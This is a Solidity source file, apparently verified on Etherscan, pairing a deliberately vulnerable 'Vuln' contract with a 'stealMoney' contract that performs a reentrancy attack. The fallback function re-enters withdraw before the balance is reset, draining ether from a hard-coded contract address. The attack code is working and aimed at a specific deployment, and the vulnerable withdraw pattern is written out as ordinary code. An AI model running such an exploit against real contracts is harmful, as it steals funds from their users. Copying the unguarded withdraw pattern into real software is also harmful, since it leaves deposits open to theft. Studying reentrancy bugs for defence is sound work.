/**
 *Submitted for verification at Etherscan.io on 2021-12-01
*/

pragma solidity ^0.5.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract stealMoney {
    address owner;
    uint public count;

    constructor() public {
        owner = msg.sender;
        count = 0;
    }
    Vuln vulnContract = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));

    function attackVulnContract() public payable {
        require(msg.value >= 0.1 ether);
        vulnContract.deposit.value(0.1 ether)();
        vulnContract.withdraw();
    }

    // payable fall back function that can call withdraw before balance is set to 0
    function () external payable {
        count++;
        if (count<5) {
            vulnContract.withdraw();
        }
    }
}